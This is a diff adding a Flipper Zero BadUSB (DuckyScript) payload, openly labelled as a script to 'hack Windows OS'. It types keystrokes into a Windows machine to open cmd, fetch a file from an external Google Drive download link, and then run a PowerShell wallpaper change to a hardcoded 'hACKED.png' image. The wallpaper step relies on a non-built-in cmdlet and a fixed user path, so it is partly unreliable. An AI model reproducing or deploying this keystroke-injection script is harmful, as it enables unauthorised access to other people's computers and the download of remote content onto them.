@@ -1,0 +1,23 @@
+
+REM This Script Was Made By RE3Z
+REM This Script Was Made For The Flipper Zero To Hack Windows OS
+
+DELAY 1300
+GUI r
+STRING cmd
+ENTER
+DELAY 1400
+STRING start https://drive.usercontent.google.com/download?id=1RxhETpxaNY9Cq0_LKoRZ9FiHeFVJm3FP&export=download&authuser=0&confirm=t&uuid=4c3a4e3e-382c-4b69-99e4-3d9e6771e9c7&at=APZUnTUF5OfzqRLlLYQiiEtl1hhX:1707942002736
+ENTER
+DELAY 1300
+STRING exit
+ENTER
+DELAY 1000
+GUI r
+STRING Powershell
+ENTER
+DELAY 1200
+STRING Set-WallPaper -Image "C:\Users\HJS\Downloads\hACKED.png" -Style Center
+ENTER
+STRING exit
+ENTER
